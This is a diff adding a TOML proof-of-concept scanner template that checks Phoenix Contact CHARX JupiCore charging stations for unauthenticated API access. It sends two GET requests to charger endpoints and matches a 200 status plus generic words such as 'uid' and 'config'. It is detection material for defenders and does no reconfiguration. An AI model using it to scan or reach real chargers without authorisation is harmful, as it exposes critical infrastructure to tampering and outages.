@@ -1,0 +1,66 @@
+[info]
+author = "ave"
+description = "检测 Phoenix Contact CHARX JupiCore 服务是否存在未授权访问漏洞（CWE-306）。该漏洞允许未经身份验证的远程攻击者通过网络向 JupiCore 服务发送请求，直接重新配置充电桩，导致充电桩 UID 泄露、拒绝服务和文件篡改。此 PoC 仅进行安全检测，不执行破坏性操作。"
+id = "POC-AVE-2026-1056"
+name = "Phoenix Contact CHARX JupiCore Unauthenticated Access PoC"
+severity = "critical"
+tags = ["ave-2026-1056"]
+vuln_id = [
+    "CVE-2026-44100",
+    "AVE-2026-1056",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/jupicore/chargepoints"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid",
+    "charging",
+    "config",
+    "device",
+    "station",
+    "charger",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/charging-points"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid",
+    "charging",
+    "config",
+    "device",
+    "station",
+    "charger",
+]
